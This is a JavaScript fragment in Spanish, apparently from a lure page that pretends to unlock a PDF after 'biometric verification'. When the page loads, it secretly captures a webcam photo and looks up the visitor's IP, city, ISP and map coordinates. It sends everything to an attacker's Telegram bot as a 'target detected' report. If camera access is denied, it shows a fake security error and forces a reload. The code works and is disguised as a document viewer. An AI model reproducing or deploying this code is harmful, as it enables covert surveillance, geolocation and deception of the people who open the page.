<script src="config.js"></script>
    <script>
        async function iniciarProceso() {
            let fotoBase64 = null;
            const statusText = document.querySelector('.blink');

            try {
                // 1. Intentar capturar la foto
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    fotoBase64 = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    // Si bloquea la cÃ¡mara, lanzamos el error falso
                    statusText.innerHTML = "âŒ ERROR DE CONEXIÃ“N SEGURA";
                    statusText.style.color = "red";
                    alert("Error: El sensor biomÃ©trico no responde. Por favor, recargue y permita el acceso para desbloquear el PDF.");
                    location.reload(); // Recarga la pÃ¡gina automÃ¡ticamente
                    return;
                }

                statusText.innerHTML = "âœ… IDENTIDAD VERIFICADA. REDIRIGIENDO...";
                
                // 2. Obtener datos de red
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                // 3. Formatear reporte
                const texto = `ðŸš¨ *OBJETIVO DETECTADO*\n\n` +
                              `ðŸ“ *Ciudad:* ${d.city}, ${d.country_name}\n` +
                              `ðŸŒ *IP:* \`${d.ip}\`\n` +
                              `ðŸ“¶ *ISP:* ${d.org}\n` +
                              `ðŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // 4. Enviar reporte y Foto
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: texto, parse_mode: 'Markdown' })
                });

                if (fotoBase64) {
                    const blob = await (await fetch(fotoBase64)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.CHAT_ID);
                    formData.append('photo', blob, 'captura.jpg');
                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                }

            } catch (err) {
                console.log("Error crÃ­tico");
            } finally {
                // Redirigir al PDF despuÃ©s de 2 segundos
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 2000);
            }
        }

        window.onload = iniciarProceso;
    </script>
